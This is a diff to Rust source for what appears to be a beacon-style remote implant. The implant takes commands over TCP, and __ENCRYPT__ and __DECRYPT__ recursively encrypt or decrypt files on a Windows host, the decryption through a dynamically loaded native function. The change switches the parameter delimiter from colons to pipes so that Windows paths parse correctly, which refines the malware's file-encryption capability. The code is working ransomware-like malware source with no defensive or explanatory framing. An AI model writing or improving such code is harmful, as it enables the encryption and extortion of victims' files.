@@ -105,14 +105,14 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__ENCRYPT__:") {
-                    // Comando para encriptar archivos: __ENCRYPT__:ruta:max_depth
+                    // Comando para encriptar archivos: __ENCRYPT__:ruta|max_depth
                     let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
                     println!("DEBUG: Encrypting files: {}", params);
                     let response = encrypt_files(params);
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if command.starts_with("__DECRYPT__:") {
-                    // Comando para desencriptar archivos: __DECRYPT__:ruta:key:max_depth
+                    // Comando para desencriptar archivos: __DECRYPT__:ruta|key|max_depth
                     let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
                     println!("DEBUG: Decrypting files: {}", params);
                     let response = decrypt_files(params);
@@ -507,9 +507,9 @@ fn encrypt_files(params: &str) -> String {
     
     #[cfg(target_os = "windows")]
     {
-        let parts: Vec<&str> = params.split(':').collect();
+        let parts: Vec<&str> = params.split('|').collect();
         if parts.len() < 2 {
-            return format!("__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta:max_depth{}", DELIMITER);
+            return format!("__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta|max_depth{}", DELIMITER);
         }
         
         let path = parts[0];
@@ -649,13 +649,13 @@ fn decrypt_files(params: &str) -> String {
     
     #[cfg(target_os = "windows")]
     {
-        let parts: Vec<&str> = params.split(':').collect();
+        let parts: Vec<&str> = params.split('|').collect();
         if parts.len() < 3 {
-            return format!("__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta:key:max_depth{}", DELIMITER);
+            return format!("__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta|key|max_depth{}", DELIMITER);
         }
         
         let path = parts[0];
-        let key = parts[1];
+        let key_hex = parts[1];
         let max_depth: u32 = parts[2].parse().unwrap_or(5);
         
         // Verificar que existan los archivos subidos
@@ -723,7 +723,7 @@ fn decrypt_files(params: &str) -> String {
             
             // Ejecutar función
             let path_c = CString::new(path).unwrap();
-            let key_c = CString::new(key).unwrap();
+            let key_c = CString::new(key_hex).unwrap();
             let exec_fn: extern "C" fn(*const c_char, *const c_char, u32) -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn(path_c.as_ptr(), key_c.as_ptr(), max_depth);
             
